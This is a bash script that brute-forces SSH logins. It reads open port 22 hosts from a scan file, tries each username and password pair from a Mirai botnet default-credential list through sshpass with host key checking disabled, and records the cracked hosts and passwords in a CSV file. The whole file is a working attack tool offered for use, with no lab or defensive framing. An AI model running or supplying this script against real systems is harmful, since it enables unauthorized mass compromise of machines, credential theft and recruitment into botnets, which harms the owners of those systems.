#!/bin/bash

# Output CSV file
output_file="cracked_hosts.csv"
apt install sshpass -y &>/dev/null
# Run the network scan and save the output


echo "Host,Username,Password" > "$output_file"  

#./get_net.sh

# File that contains the brute-force usernames and passwords
CREDENTIALS_FILE="mirai-botnet.txt"

# Read the CSV file line by line
while IFS=, read -r HOST PORT STATE; do
    # Check if the port is SSH (22/tcp) and is open
    if [[ "$PORT" == "22/tcp" && "$STATE" == "open" ]]; then
        echo "Trying SSH brute-force on $HOST"

        # Attempt to login using each username and password pair from mirai-botnet.txt
        while IFS= read -r line; do
            
            USERNAME=$(echo "$line" | cut -d' ' -f1)
            PASSWORD=$(echo "$line" | cut -d' ' -f2)

            # Try to SSH into the host using the current username and password
            sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$USERNAME@$HOST" "echo Success" &>/dev/null

            # Check if the login was successful
            if [ $? -eq 0 ]; then
                echo "Success! Logged into $HOST with username '$USERNAME' and password '$PASSWORD'"
                echo "$HOST,$USERNAME,$PASSWORD" >> "$output_file"
                break
            fi

        done < "$CREDENTIALS_FILE"
    fi
done < open_ports.csv


